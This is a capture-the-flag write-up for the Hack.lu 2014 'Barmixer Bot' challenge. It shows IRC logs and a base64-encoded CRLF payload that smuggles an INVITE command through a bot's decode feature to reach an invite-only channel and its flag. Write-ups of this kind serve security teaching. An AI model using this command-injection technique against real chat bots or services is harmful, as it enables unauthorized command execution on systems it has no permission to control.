# Hack.lu CTF 2014: Barmixer Bot

**Category:** Misc
**Points:** 200
**Author:** freddy
**Description:**

> There’s a fun and quirky IRC bot to play with. It responds to commands in private chat but also in #hacklu-saloon on freenode. We think it’s involved in a devious scheme that distracts people to get their money pickpocketed. So be careful!
>
> **Announcement:** Due to a clever hack, somebody took over the nickname `barmixer-bot`, so it is now called `barmixing-bot`.

## Write-up

In the `#hacklu-saloon` channel on Freenode is a bot with operator privileges named `barmixer-bot` (later `barmixing-bot`).

```
22:32:57 <mathiasbynens> !help
22:32:58 <barmixing-bot> Send messages to the bot or the channel starting with an exclamation mark. Known commands are list, status, karma, math, base64, base64d, rot13, ping, hack, request, list
22:33:32 <mathiasbynens> !list
22:33:33 <barmixing-bot> Not implemented ;-)
22:33:34 <mathiasbynens> !status
22:33:35 <barmixing-bot> My name is barmixing-bot, my uptime is 3 hours 7 minutes and 18 seconds. I am on the following channels: #hacklu-saloon, #hacklu-secret-channel
```

That `#hacklu-secret-channel` sure looks interesting. Sadly it’s not possible to just `/join` it, as it’s an invite-only channel.

Some testing reveals that the bot’s `!base64d` functionality can be exploited. By letting the bot decode a multi-line message, remote IRC command execution is possible. Let’s use this to trick the bot into inviting us to the secret channel:

```bash
$ printf "hi\r\nINVITE mathiasbynens #hacklu-secret-channel" | base64
aGkNCklOVklURSBtYXRoaWFzYnluZW5zICNoYWNrbHUtc2VjcmV0LWNoYW5uZWw=
```

Let’s feed this message to the bot for decoding:

```
22:38:44 <mathiasbynens> !base64d aGkNCklOVklURSBtYXRoaWFzYnluZW5zICNoYWNrbHUtc2VjcmV0LWNoYW5uZWw=
22:38:44 <barmixing-bot> hi
22:38:44 <barmixing-bot> Invite to join #hacklu-secret-channel
```

Joining `#hacklu-secret-channel` reveals the flag in the topic:

```
FLAG: GfeBNmN5XjwDvQB64qoqaEEeYogk4rGH3ikZ0qtc3B3HKLDoAH
```

The flag is `GfeBNmN5XjwDvQB64qoqaEEeYogk4rGH3ikZ0qtc3B3HKLDoAH`.

## Other write-ups and resources

* none yet
